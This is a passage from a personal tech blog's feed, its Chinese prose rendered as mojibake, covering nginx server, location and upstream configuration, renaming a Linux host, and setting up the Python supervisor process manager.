class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><p><code>off</code> å°±æ˜¯ä¸²è¡Œ, ä¹Ÿå°±æ˜¯é»˜è®¤å€¼.</p><h3 id="http-å—"><a href="#http-å—" class="headerlink" title="http å—"></a>http å—</h3><p>æ•´ä½“è§‚æ„Ÿ, è¿™ä¸ªéƒ¨åˆ†çš„è®¾ç½®å°±æœ‰å¾ˆå¤šé€‰æ‹©äº†, è¿™ä¸€éƒ¨åˆ†å°±å‚è€ƒåˆ«äººçš„è®²è§£:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;<br>    <span class="hljs-attribute">types_hash_max_size</span> <span class="hljs-number">2048</span>;<br>    <span class="hljs-attribute">include</span> /etc/nginx/mime.types;<br>    <span class="hljs-attribute">default_type</span> application/octet-stream;<br>    <span class="hljs-attribute">access_log</span> /var/log/nginx/access_log;<br>    <span class="hljs-attribute">error_log</span> /var/log/nginx/error_log;<br><br>    <span class="hljs-attribute">server_names_hash_bucket_size</span> <span class="hljs-number">128</span>;<br>    <span class="hljs-attribute">client_header_buffer_size</span> <span class="hljs-number">32k</span>;<br>    <span class="hljs-attribute">large_client_header_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">32k</span>;<br>    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">50m</span>;<br><br>    <span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;msie6&quot;</span>;<br><br>    <span class="hljs-attribute">include</span> /etc/nginx/conf.d/<span class="hljs-regexp">*.conf</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.muouseo.com/article/n2oeglwy73.html">å‚è€ƒ1</a><br><a href="https://www.jb51.net/article/182585.htm">å‚è€ƒ2</a></p><p>ä¸€éƒ¨åˆ†è§£é‡Š:</p><p><code>include</code> æŒ‡ä»¤ç”¨æ¥åŒ…å«å¦å¤–çš„é…ç½®æ–‡ä»¶.</p><p><code>default_type</code> å½“æ–‡ä»¶ç±»å‹æœªå®šä¹‰æ—¶ä½¿ç”¨è¿™ä¸ªç±»å‹, é»˜è®¤å€¼ä¸ºäºŒè¿›åˆ¶æµ.</p><p><code>sendfile on</code> è¡¨ç¤ºå¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼, é»˜è®¤ä¸º off.</p><p><code>tcp_nopush on</code> å’Œ <code>tcp_nodelay on</code> ç”¨æ¥é˜²æ­¢ç½‘ç»œå µå¡. </p><p><code>keepalive_timeout + æ•°å­—</code> è®¾ç½®è¿æ¥è¶…æ—¶é™åˆ¶.</p><h3 id="server-ä»£ç å—"><a href="#server-ä»£ç å—" class="headerlink" title="server ä»£ç å—"></a>server ä»£ç å—</h3><p>è¿™ä¸ªä¸€èˆ¬æ”¾åœ¨ http block é‡Œé¢, è€Œä¸”ä¸€èˆ¬ä¸æ”¾åœ¨ <code>nginx.conf</code> è¿™ä¸ªä¸»é…ç½®æ–‡ä»¶ä¸­, è€Œæ˜¯ç”¨ <code>include</code> æŒ‡ä»¤åŒ…å«è¿›æ¥.</p><p>server å—: é…ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³å‚æ•°.<br>æ¯”å¦‚:</p><p>ä¸¤ä¸ªç›®å½• (ä¹Ÿå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹):</p><ul><li><code>/etc/nginx/sites-available</code></li><li><code>/etc/nginx/sites-enabled</code></li></ul><p>å¯ä»¥åœ¨ <code>sites-available</code> ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶, å¹¶å†™å…¥ <code>server</code> æ¨¡å—.</p><p>å¯ä»¥åœ¨ <code>nginx.conf</code> æ–‡ä»¶ä¸­æŸä¸ª block ä¸‹å†™å…¥:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-meta"><span class="hljs-keyword">include</span> site-enabled/*</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ·»åŠ æŸä¸ª <code>server</code> çš„æ—¶å€™, åˆ›å»ºä¸€ä¸ª symbolic link å°±å¯ä»¥äº†.</p><p>server å—çš„ä½œç”¨å°±æ˜¯è®¾ç½®è™šæ‹Ÿä¸»æœº (ç”¨æ¥åŒ¹é…çš„åŸŸå).</p><p>å¤§æ¦‚:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server &#123;<br>    listen xx;                 <span class="hljs-comment"># æœ¬æœºçš„ç›‘å¬ç«¯å£</span><br>    server_name xxx;           <span class="hljs-comment"># è™šæ‹Ÿä¸»æœºå</span><br>    root xxx;                  <span class="hljs-comment"># èµ„æºæ‰€å¤„çš„æ ¹ç›®å½•</span><br>    index xxx;                 <span class="hljs-comment"># é»˜è®¤æ‰“å¼€çš„ç•Œé¢</span><br>    autoindex [on/off];        <span class="hljs-comment"># ä»¥åˆ—è¡¨å½¢å¼æ˜¾ç¤ºè€Œä¸æ˜¯ç›´æ¥æ‰“å¼€</span><br>    autoindex_localtime on;    <span class="hljs-comment"># åˆ—è¡¨ä¸­æ˜¾ç¤ºæ—¶é—´</span><br>    autoindex_exact_size off;  <span class="hljs-comment"># åˆ—è¡¨ä¸­æ˜¾ç¤ºå¤§å°, ä»¥ KB, MB, GB å½¢å¼</span><br><br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        return</span> xxx;<br>    &#125;<br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        proxy_pass</span> xxx;<br>    &#125;<br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        index</span> xxx;<br>        allow xxx;<br>        <span class="hljs-keyword">deny</span>  xxx;<br>    &#125;<br><br>    error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  /<span class="hljs-number">50</span>x.html;  <span class="hljs-comment"># è®¾ç½®é”™è¯¯é¡µ</span><br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰å‡ ä¸ª <code>server</code> æ¨¡å—, å°±å¯ä»¥è®¾ç½®å‡ ä¸ªè™šæ‹Ÿä¸»æœº.</p><p>nginx ä¼šå†³å®šå“ªä¸ª server æ¥å¤„ç†å“ªä¸ª request.</p><h3 id="location-éƒ¨åˆ†"><a href="#location-éƒ¨åˆ†" class="headerlink" title="location éƒ¨åˆ†"></a>location éƒ¨åˆ†</h3><p>location å— (URL åŒ¹é…ç‰¹å®šä½ç½®çš„è®¾ç½®): é…ç½®è¯·æ±‚è·¯ç”±, ä»¥åŠå„ç§é¡µé¢çš„å¤„ç†æƒ…å†µ.<br>ä¸€èˆ¬è¿™ä¸ªå½¢å¼:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">xxx</span> &#123;<br>    xxx;<br>&#125;<br></code></pre></td></tr></table></figure><p>location å—çš„å‰ç¼€:<br><img src="/../img/prefix_of_location_block.png" alt="location å—çš„å‰ç¼€"></p><p>å‡ºç°ä»»ä½•é—®é¢˜éƒ½å¯ä»¥æŸ¥çœ‹ <code>/usr/local/nginx/logs</code> æˆ– <code>/var/log/nginx</code> å¤„çš„æ—¥å¿—æ–‡ä»¶.</p><h4 id="ä¸åŒç«¯å£ä»£ç†ä¸åŒé¡µé¢"><a href="#ä¸åŒç«¯å£ä»£ç†ä¸åŒé¡µé¢" class="headerlink" title="ä¸åŒç«¯å£ä»£ç†ä¸åŒé¡µé¢"></a>ä¸åŒç«¯å£ä»£ç†ä¸åŒé¡µé¢</h4><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8885/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8886/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8886/;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ˜¾ç¤ºä¸€ä¸ªé¡µé¢"><a href="#æ˜¾ç¤ºä¸€ä¸ªé¡µé¢" class="headerlink" title="æ˜¾ç¤ºä¸€ä¸ªé¡µé¢"></a>æ˜¾ç¤ºä¸€ä¸ªé¡µé¢</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">index</span> xxx;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç½‘é¡µè·³è½¬"><a href="#ç½‘é¡µè·³è½¬" class="headerlink" title="ç½‘é¡µè·³è½¬"></a>ç½‘é¡µè·³è½¬</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://www.baidu.com/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://github.com/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://www.google.com/;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="upstream-å—"><a href="#upstream-å—" class="headerlink" title="upstream å—"></a>upstream å—</h3><p>upstream å— (è´Ÿè½½å‡è¡¡æœåŠ¡å™¨è®¾ç½®): æŒ‡ä»¤ä¸»è¦ç”¨äºè´Ÿè½½å‡è¡¡, è®¾ç½®ä¸€ç³»åˆ—çš„åç«¯æœåŠ¡å™¨, upstream åçš„åç§°å’Œåé¢ <code>proxy_pass</code> è¦å¯¹åº”èµ·æ¥.<br>ç¤ºä¾‹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>       <span class="hljs-attribute">listen</span>          <span class="hljs-number">0.0.0.0:80</span>;<br>       <span class="hljs-attribute">server_name</span>     _;<br><br>       <span class="hljs-attribute">root</span>            /var/www/html;<br>       <span class="hljs-attribute">index</span>           /index.nginx-debian.html;<br><br>       <span class="hljs-attribute">access_log</span>      /var/log/nginx/default_access.log;<br>       <span class="hljs-attribute">error_log</span>       /var/log/nginx/default_error.log;<br><br>       <span class="hljs-section">location</span> <span class="hljs-regexp">~ /h</span> &#123;<br>          <span class="hljs-attribute">proxy_pass</span> http://webthreepages;<br>       &#125;<br>&#125;<br><br><span class="hljs-section">upstream</span> webthreepages &#123;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:80</span> weight=<span class="hljs-number">1</span>;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:81</span> weight=<span class="hljs-number">2</span>;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:82</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><p>Nginx çš„æ­£åˆ™è¡¨è¾¾å¼æ”¯æŒçš„ç‰¹æ®Šå­—ç¬¦:</p><ul><li><code>*</code></li><li><code>+</code></li><li><code>?</code></li><li><code>^</code> å’Œ <code>$</code></li><li><code>.</code></li><li><code>[]</code></li><li><code>&#123;&#125;</code></li><li><code>()</code></li><li><code>|</code></li><li><code>\d</code>, <code>\D</code>, <code>\w</code>, <code>\W</code><br>åŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„.</li></ul>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¿®æ”¹ Linux ä¸»æœºå</title>
    <link href="/2022/08/28/%E4%BF%AE%E6%94%B9-Linux-%E4%B8%BB%E6%9C%BA%E5%90%8D/"/>
    <url>/2022/08/28/%E4%BF%AE%E6%94%B9-Linux-%E4%B8%BB%E6%9C%BA%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p>ä¿®æ”¹ <code>/etc/hostname</code> æ–‡ä»¶å³å¯ã€‚</p><p>ä½¿å…¶ç«‹å³ç”Ÿæ•ˆ:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> æ–°çš„åå­—<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ supervisor åº“</title>
    <link href="/2022/08/28/Python-%E4%B8%AD-supervisor-%E5%BA%93/"/>
    <url>/2022/08/28/Python-%E4%B8%AD-supervisor-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p><a href="http://supervisord.org/">å®˜ç½‘</a><br><a href="https://www.jb51.net/article/235260.htm">å‚è€ƒåšå®¢</a></p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>æ˜¯ç”¨ Python å¼€å‘çš„ client&#x2F;server æœåŠ¡ï¼Œä¸º Linux&#x2F;Unix ç³»ç»Ÿä¸‹çš„è¿›ç¨‹ç®¡ç†ç¨‹åº.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> supervisor<br></code></pre></td></tr></table></figure><p>å®‰è£…ä¹‹å(Ubuntu 22.04)ï¼Œ<code>~/.local/bin</code> ç›®å½•ä¸‹ä¼šå‡ºç°ä¸‰ä¸ªç¨‹åº:</p><ul><li>supervisortd</li><li>supervisorctl</li><li>echo_supervisord_conf, ç”¨äºç”Ÿæˆåˆå§‹åŒ–é…ç½®æ–‡ä»¶ <code>/etc/supervisord.conf</code></li></ul><h1 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h1><p>å…¶ç”±ä¸¤ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†:</p><ul><li>supervisord, ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè´Ÿè´£å¯åŠ¨æ‰€ç®¡ç†çš„è¿›ç¨‹ï¼Œå¹¶å°†æ‰€ç®¡ç†çš„è¿›ç¨‹ä½œä¸ºè‡ªå·±çš„å­ç¨‹åºå¯åŠ¨ï¼Œåœ¨æ‰€ç®¡ç†çš„è¿›ç¨‹å‡ºç°å´©æºƒæ—¶ä¼šè‡ªåŠ¨é‡å¯</li><li>supervisorctl, ä¸€ä¸ªå‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œç”¨äºæ‰§è¡Œ stop, start, restart ç­‰å‘½ä»¤</li></ul><h1 id="åˆ›å»ºé…ç½®æ–‡ä»¶"><a href="#åˆ›å»ºé…ç½®æ–‡ä»¶" class="headerlink" title="åˆ›å»ºé…ç½®æ–‡ä»¶"></a>åˆ›å»ºé…ç½®æ–‡ä»¶</h1><p>è°ƒç”¨ <code>echo_supervisord_conf</code> å‘½ä»¤ï¼Œå…ˆæ·»åŠ è‡³ <code>PATH</code> å˜é‡:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> ~<br>vim <span class="hljs-string">.bashrc</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ : <code>export PATH=$PATH:~/.local/bin</code></p><p>å› ä¸ºæˆ‘ä»¬ä»¥æ™®é€šç”¨æˆ·æ“ä½œï¼Œæ‰§è¡Œ:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo chown user.<span class="hljs-keyword">user</span> <span class="hljs-title">/etc</span>/supervisord.conf<br></code></pre></td></tr></table></figure><p>å¼€å§‹åˆå§‹åŒ–:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ echo_supervisord_conf &gt; <span class="hljs-regexp">/etc/</span>supervisord.conf<br></code></pre></td></tr></table></figure><p>å› åç»­æƒé™é—®é¢˜è¿˜æ˜¯æŠŠ <code>/etc/supervisord.conf</code> çš„æ‰€å±æ”¹ä¸º root.</p><h2 id="ä½¿ç”¨-include"><a href="#ä½¿ç”¨-include" class="headerlink" title="ä½¿ç”¨ include"></a>ä½¿ç”¨ include</h2><p><code>/etc/supervisord.conf</code> æ–‡ä»¶çš„æœ€åæ˜¯:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[<span class="hljs-keyword">include</span>]<br>files = relative<span class="hljs-regexp">/directory/</span>*.ini<br></code></pre></td></tr></table></figure><p>å…¶ç”¨æ¥ä¸ºè¿›ç¨‹å†™é…ç½®æ–‡ä»¶.</p><p>æ­¤æ—¶åˆ›å»ºä¸€ä¸ªç›®å½•å¹¶æ·»åŠ è‡³ <code>[include]</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /etc/supervisor ;<span class="hljs-built_in">cd</span> /etc/supervisor</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> config.d</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®æ–‡ä»¶è¯¦è§£"><a href="#é…ç½®æ–‡ä»¶è¯¦è§£" class="headerlink" title="é…ç½®æ–‡ä»¶è¯¦è§£"></a>é…ç½®æ–‡ä»¶è¯¦è§£</h2><ul><li>commandï¼šå¯åŠ¨ç¨‹åºä½¿ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„</li><li>process_nameï¼šä¸€ä¸ªpythonå­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œç”¨æ¥è¡¨ç¤ºsupervisorè¿›ç¨‹å¯åŠ¨çš„è¿™ä¸ªçš„åç§°ï¼Œé»˜è®¤å€¼æ˜¯%(program_name)s</li><li>numprocsï¼šSupervisorå¯åŠ¨è¿™ä¸ªç¨‹åºçš„å¤šä¸ªå®ä¾‹ï¼Œå¦‚æœnumprocs&gt;1ï¼Œåˆ™process_nameçš„è¡¨è¾¾å¼å¿…é¡»åŒ…å«%(process_num)sï¼Œé»˜è®¤æ˜¯1</li><li>numprocs_startï¼šä¸€ä¸ªintåç§»å€¼ï¼Œå½“å¯åŠ¨å®ä¾‹çš„æ—¶å€™ç”¨æ¥è®¡ç®—numprocsçš„å€¼</li><li>priorityï¼šæƒé‡ï¼Œå¯ä»¥æ§åˆ¶ç¨‹åºå¯åŠ¨å’Œå…³é—­æ—¶çš„é¡ºåºï¼Œæƒé‡è¶Šä½ï¼šè¶Šæ—©å¯åŠ¨ï¼Œè¶Šæ™šå…³é—­ã€‚é»˜è®¤å€¼æ˜¯999</li><li>autostartï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œå½“supervisordå¯åŠ¨çš„æ—¶å€™ï¼Œè¿›ç¨‹ä¼šè‡ªåŠ¨é‡å¯ã€‚</li><li>autorestartï¼šå€¼å¯ä»¥æ˜¯falseã€trueã€unexpectedã€‚falseï¼šè¿›ç¨‹ä¸ä¼šè‡ªåŠ¨é‡å¯ï¼Œunexpectedï¼šå½“ç¨‹åºé€€å‡ºæ—¶çš„é€€å‡ºç ä¸æ˜¯exitcodesä¸­å®šä¹‰çš„æ—¶ï¼Œè¿›ç¨‹ä¼šé‡å¯ï¼Œtrueï¼šè¿›ç¨‹ä¼šæ— æ¡ä»¶é‡å¯å½“é€€å‡ºçš„æ—¶å€™ã€‚</li><li>startsecsï¼šç¨‹åºå¯åŠ¨åç­‰å¾…å¤šé•¿æ—¶é—´åæ‰è®¤ä¸ºç¨‹åºå¯åŠ¨æˆåŠŸ</li><li>startretriesï¼šsupervisordå°è¯•å¯åŠ¨ä¸€ä¸ªç¨‹åºæ—¶å°è¯•çš„æ¬¡æ•°ã€‚é»˜è®¤æ˜¯3</li><li>exitcodesï¼šä¸€ä¸ªé¢„æœŸçš„é€€å‡ºè¿”å›ç ï¼Œé»˜è®¤æ˜¯0,2ã€‚</li><li>stopsignalï¼šå½“æ”¶åˆ°stopè¯·æ±‚çš„æ—¶å€™ï¼Œå‘é€ä¿¡å·ç»™ç¨‹åºï¼Œé»˜è®¤æ˜¯TERMä¿¡å·ï¼Œä¹Ÿå¯ä»¥æ˜¯ HUP, INT, QUIT, KILL, USR1, or USR2ã€‚</li><li>stopwaitsecsï¼šåœ¨æ“ä½œç³»ç»Ÿç»™supervisordå‘é€SIGCHILDä¿¡å·æ—¶ç­‰å¾…çš„æ—¶é—´</li><li>stopasgroupï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™ä¼šä½¿supervisorå‘é€åœæ­¢ä¿¡å·åˆ°æ•´ä¸ªè¿›ç¨‹ç»„</li><li>killasgroupï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™åœ¨ç»™ç¨‹åºå‘é€SIGKILLä¿¡å·çš„æ—¶å€™ï¼Œä¼šå‘é€åˆ°æ•´ä¸ªè¿›ç¨‹ç»„ï¼Œå®ƒçš„å­è¿›ç¨‹ä¹Ÿä¼šå—åˆ°å½±å“ã€‚</li><li>userï¼šå¦‚æœsupervisordä»¥rootè¿è¡Œï¼Œåˆ™ä¼šä½¿ç”¨è¿™ä¸ªè®¾ç½®ç”¨æˆ·å¯åŠ¨å­ç¨‹åº</li><li>redirect_stderrï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¿›ç¨‹åˆ™ä¼šæŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°supervisordåå°çš„æ ‡å‡†è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ã€‚</li><li>stdout_logfileï¼šæŠŠè¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºå†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦‚æœstdout_logfileæ²¡æœ‰è®¾ç½®æˆ–è€…è®¾ç½®ä¸ºAUTOï¼Œåˆ™supervisorä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶ä½ç½®ã€‚</li><li>stdout_logfile_maxbytesï¼šæ ‡å‡†è¾“å‡ºlogæ–‡ä»¶è¾¾åˆ°å¤šå°‘åè‡ªåŠ¨è¿›è¡Œè½®è½¬ï¼Œå•ä½æ˜¯KBã€MBã€GBã€‚å¦‚æœè®¾ç½®ä¸º0åˆ™è¡¨ç¤ºä¸é™åˆ¶æ—¥å¿—æ–‡ä»¶å¤§å°</li><li>stdout_logfile_backupsï¼šæ ‡å‡†è¾“å‡ºæ—¥å¿—è½®è½¬å¤‡ä»½çš„æ•°é‡ï¼Œé»˜è®¤æ˜¯10ï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™ä¸å¤‡ä»½</li><li>stdout_capture_maxbytesï¼šå½“è¿›ç¨‹å¤„äºstderr capture modeæ¨¡å¼çš„æ—¶å€™ï¼Œå†™å…¥FIFOé˜Ÿåˆ—çš„æœ€å¤§byteså€¼ï¼Œå•ä½å¯ä»¥æ˜¯KBã€MBã€GB</li><li>stdout_events_enabledï¼šå¦‚æœè®¾ç½®ä¸ºtrueï¼Œå½“è¿›ç¨‹åœ¨å†™å®ƒçš„stderråˆ°æ–‡ä»¶æè¿°ç¬¦çš„æ—¶å€™ï¼ŒPROCESS_LOG_STDERRäº‹ä»¶ä¼šè¢«è§¦å‘</li><li>stderr_logfileï¼šæŠŠè¿›ç¨‹çš„é”™è¯¯æ—¥å¿—è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé™¤éredirect_stderrå‚æ•°è¢«è®¾ç½®ä¸ºtrue</li><li>stderr_logfile_maxbytesï¼šé”™è¯¯logæ–‡ä»¶è¾¾åˆ°å¤šå°‘åè‡ªåŠ¨è¿›è¡Œè½®è½¬ï¼Œå•ä½æ˜¯KBã€MBã€GBã€‚å¦‚æœè®¾ç½®ä¸º0åˆ™è¡¨ç¤ºä¸é™åˆ¶æ—¥å¿—æ–‡ä»¶å¤§å°</li><li>stderr_logfile_backupsï¼šé”™è¯¯æ—¥å¿—è½®è½¬å¤‡ä»½çš„æ•°é‡ï¼Œé»˜è®¤æ˜¯10ï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™ä¸å¤‡ä»½</li><li>stderr_capture_maxbytesï¼šå½“è¿›ç¨‹å¤„äºstderr capture 